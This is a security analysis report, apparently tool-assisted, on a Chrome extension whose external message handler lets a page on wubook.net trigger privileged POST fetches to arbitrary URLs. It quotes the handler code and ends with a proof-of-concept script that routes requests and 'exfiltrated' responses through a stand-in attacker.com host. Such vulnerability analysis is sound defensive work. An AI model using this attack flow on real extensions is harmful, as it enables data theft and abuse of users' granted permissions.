# CoCo Analysis: dackcemocldjihamfcidcjhfpfbdadan

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (but both are part of same vulnerability)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dackcemocldjihamfcidcjhfpfbdadan/opgen_generated_files/bg.js
Line 1174: `var mparams = msg['params'];`
Line 1158: `'addon.origins.is_allowed': (params, cback) => { has_permission_for_ecr_url(params['ecr_url'], cback) }`

## Sink 2: fetch_source → sendResponseExternal_sink (referenced only CoCo framework code)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dackcemocldjihamfcidcjhfpfbdadan/opgen_generated_files/bg.js
Line 265: `var responseText = 'data_from_fetch';` (CoCo framework code)

The actual flow is in the extension code after line 963.

**Code:**

```javascript
// Background script - Message handler (lines 1162-1184)
function process_msg(msg, sender, sendResponse) {
  Logger.log(sender.tab ?
                "from a content script:" + sender.tab.url :
                "from the extension");

  // we enable to send messages only by tabs
  if (!sender.tab) return
  // we enable messages only from this specific domain
  if (!sender.tab.url.startsWith('https://wubook.net/zks/')) return  // ← Entry point restriction

  var mid = msg['id'];  // ← attacker-controlled
  var mparams = msg['params'];  // ← attacker-controlled

  if (messages_mapper.hasOwnProperty(mid)) {
    messages_mapper[mid](mparams, sendResponse, msg, sender);
    return true
  }
  Logger.log('message id not found:', mid)
  return false
}

chrome.runtime.onMessageExternal.addListener(process_msg);

// Messages mapper (lines 1151-1160)
const messages_mapper= {
  'addon.version': (_, cback) => { cback({'version': get_version()}) },
  'addon.id.check': addon_id_check,
  'ecr.send.msg': ecr_send_msg,  // ← Main vulnerability
  'ecr.send.msg.execution.long': ecr_send_msg_long_execution,
  'addon.origins.request': (params, cback) => { request_permission_for_ecr_url(params['ecr_url'], cback) },
  'addon.origins.remove': (params, cback) => { remove_permission_for_ecr_url(params['ecr_url'], cback) },
  'addon.origins.is_allowed': (params, cback) => { has_permission_for_ecr_url(params['ecr_url'], cback) },
  'addon.origins.all': (_, cback) => { chrome.permissions.getAll((data) => { cback({'origins': data['origins'] || []}) }) }
}

// ecr_send_msg function (lines 1111-1141)
function ecr_send_msg(params, cback) {
  const msg_id= params['id']
  const ecr_url= params['ecr_url']  // ← attacker-controlled URL
  const msg_data= params['msg']  // ← attacker-controlled data

  let rqst_options= {
    method: 'POST',
  }
  if (msg_data) {
    const parsed_msg_data= parse_body_msg(msg_data)
    rqst_options['body']= parsed_msg_data  // ← attacker-controlled body
  }

  request_permission_for_ecr_url(ecr_url, function(granted) {
    if (!granted['granted']) {
      const ecr_res= {'error': granted['error'], 'id': msg_id}
      return cback(ecr_res)
    }

    fetch(ecr_url, rqst_options)  // ← Fetch to attacker-controlled URL
    .then(response => response.text())
    .then(res => {
      const ecr_res= {'ecr_response': res, 'id': msg_id}  // ← Response from attacker URL
      cback(ecr_res)  // ← Sends response back to attacker via sendResponse
    })
    .catch(error => {
      const ecr_res= {'error': error.toString(), 'id': msg_id}
      cback(ecr_res)
    })
  })
}

// Permission request function (lines 1031-1052)
function request_permission_for_ecr_url(ecr_url, cback) {
  if (!is_valid_ecr_url(ecr_url)) {
    Logger.log('we requested permission for domain', ecr_url, 'but is not a valid ecr_url')
    const res= {'granted': false, 'error': 'ecr_url is not valid'}
    cback(res)
    return
  }

  let ecr_url_to_check= extract_domain_for_request_permission(ecr_url)
  ecr_url_to_check+= '/*'

  chrome.permissions.request({
    origins: [ecr_url_to_check]  // ← User prompted for permission
  }, function(granted) {
    Logger.log('we requested permission for domain', ecr_url_to_check)
    let res= {'granted': granted}
    if (!granted) {
      res['error']= `user not allowed us to contact ecr domain: ${ecr_url_to_check}`
    }
    cback(res)
  })
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages from whitelisted domain `https://wubook.net/zks/*`

**Attack:**

```javascript
// Step 1: Request permission for attacker domain (user must click "Allow")
chrome.runtime.sendMessage(
  'extension_id_here',
  {
    id: 'addon.origins.request',
    params: { ecr_url: 'https://attacker.com/steal' }
  },
  (response) => {
    if (response.granted) {
      // Step 2: Once permission granted, send fetch request
      chrome.runtime.sendMessage(
        'extension_id_here',
        {
          id: 'ecr.send.msg',
          params: {
            ecr_url: 'https://attacker.com/steal',
            msg: 'sensitive_data_or_request',
            id: 'msg123'
          }
        },
        (response) => {
          // Step 3: Attacker receives response from their own server
          console.log('Exfiltrated response:', response.ecr_response);
        }
      );
    }
  }
);
```

**Impact:** Privileged cross-origin requests to attacker-controlled destinations with response exfiltration. After user grants permission once, the attacker from `https://wubook.net/zks/*` can make arbitrary POST requests to their domain and retrieve responses. This enables data exfiltration, CSRF attacks with elevated privileges, and communication with attacker infrastructure through the extension's elevated permissions.
